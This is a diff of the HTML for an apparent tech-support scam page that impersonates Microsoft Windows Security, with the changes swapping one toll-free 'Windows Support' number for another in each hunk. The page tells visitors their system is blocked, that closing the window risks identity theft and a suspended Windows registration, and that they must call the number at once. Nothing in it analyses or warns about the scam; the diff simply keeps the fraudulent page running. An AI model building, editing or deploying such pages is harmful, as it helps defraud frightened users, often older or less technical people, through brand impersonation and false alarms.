@@ -220,7 +220,7 @@
           <div class="right-foot" style="text-align:center;margin-bottom: 5px;">
             <span id="footertxt">
               <img src="msmm.png"> Windows security </span>
-            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Windows Support: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> Call us directly +1-888-928-6086
+            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Windows Support: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> Call us directly +1-888-928-2134
               </span>
             </span>
           </div>
@@ -255,7 +255,7 @@
       </div>
       <img src="re.gif" id="banner">
       <div id="disclaimer">Access to this system is blocked for security reasons.  <br>
-        <span class="support" style="font-size:22px;">Please call Windows Support:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> Call us directly +1-888-928-6086
+        <span class="support" style="font-size:22px;">Please call Windows Support:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> Call us directly +1-888-928-2134
           </span>
         </span>
       </div>
@@ -292,7 +292,7 @@
        <p>Call Windows Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
        <p>Closing this window may put your personal information at risk and may cause your Windows registration to be suspended. </p>
       <p style="padding-bottom:0;color:#fff;font-size:16px">Call Windows Support: <strong>
-          <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br/>Call us directly  +1-888-928-6086
+          <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br/>Call us directly  +1-888-928-2134
           </span>
         </strong>
       </p>
@@ -303,7 +303,7 @@
     </div>
     <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
       <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">Please contact us immediately. Our engineer will guide you through the removal process over the phone. Your computer has been disabled. Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may put your system at risk. <br>
-        <strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="winlo.png" alt="&nbsp"  style="width: 25px;vertical-align: bottom;"> Call us directly +1-888-928-6086
+        <strong>Call Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src="winlo.png" alt="&nbsp"  style="width: 25px;vertical-align: bottom;"> Call us directly +1-888-928-2134
           </span>
         </strong>
       </p>
@@ -313,7 +313,7 @@
       <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
       <p style="font-weight:600;font-size:24px">Call support: <br>
       </p>
-      <h4 style="font-weight:600;font-size:22px"> <img src="winlo.png" alt=""  style="width: 25px;margin-left: 0;"> Call us directly +1-888-928-6086
+      <h4 style="font-weight:600;font-size:22px"> <img src="winlo.png" alt=""  style="width: 25px;margin-left: 0;"> Call us directly +1-888-928-2134
         <br>(Security Support)
       </h4>
       <div class="arrow-down">
